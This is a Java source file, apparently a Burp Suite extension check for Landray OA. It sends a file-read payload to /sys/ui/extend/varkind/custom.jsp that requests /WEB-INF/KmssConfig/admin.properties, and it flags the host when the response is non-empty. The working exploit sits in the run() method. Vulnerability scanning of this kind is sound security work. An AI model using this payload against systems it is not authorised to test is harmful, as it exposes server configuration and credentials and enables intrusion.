package burp.vuls;

import burp.*;
import burp.impl.VulResult;
import burp.impl.VulTaskImpl;
import burp.task.BeanParamInject;
import burp.task.XssReflect;
import burp.util.HttpRequestResponseFactory;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.List;

public class LandrayOa extends VulTaskImpl {

    public static VulTaskImpl getInstance(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log){
        return new LandrayOa(helpers, callbacks, log);
    }
    private LandrayOa(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log) {
        super(helpers, callbacks, log);
    }

    @Override
    public void run() {
        //新的请求包
        url = iHttpService.getProtocol() + "://" + iHttpService.getHost() + ":" + iHttpService.getPort() + "/sys/ui/extend/varkind/custom.jsp";
        String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
        //新请求
        okHttpRequester.send(url, method, request_header_list, query, poc_body, contentYtpe, new LandrayOaCallback(this));
        BurpExtender.vulsChecked.add("burp.vuls.LandrayOa" + host + iHttpService.getPort()); //添加检测标记
    }
}

class LandrayOaCallback implements Callback {

    VulTaskImpl vulTask;

    public LandrayOaCallback(VulTaskImpl vulTask){
        this.vulTask = vulTask;
    }
    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        vulTask.callbacks.printError("[LandrayOaCallback-onFailure] " + e.getMessage() + "\n" + vulTask.request_info);
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        if (response.isSuccessful()){
            vulTask.setOkhttpMessage(call, response); //保存okhttp的请求响应信息
            // 检查响应体是否有内容
            if (vulTask.ok_respBody.length() > 0) {
                vulTask.message = "LandrayOa Vul";
                vulTask.log(call);
            }
        }
    }
}